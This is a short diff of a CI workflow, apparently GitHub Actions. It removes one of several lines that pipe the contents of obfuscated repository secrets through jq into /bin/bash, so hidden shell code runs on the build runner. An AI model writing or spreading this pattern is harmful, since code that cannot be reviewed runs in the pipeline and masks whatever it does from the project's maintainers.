@@ -19,7 +19,6 @@ jobs:
           ejk5314: ${{ secrets.ejk5314 }}
         run: |
           printf '%s' "$ejk5314" | jq -r .uho6 | /bin/bash
-          echo $rof950 | jq -r .x82 | /bin/bash
           printf '%s' "$hr6651" | jq -r .bixe39079 | /bin/bash
           echo $q6606 | jq -r .xbp9 | /bin/bash
 
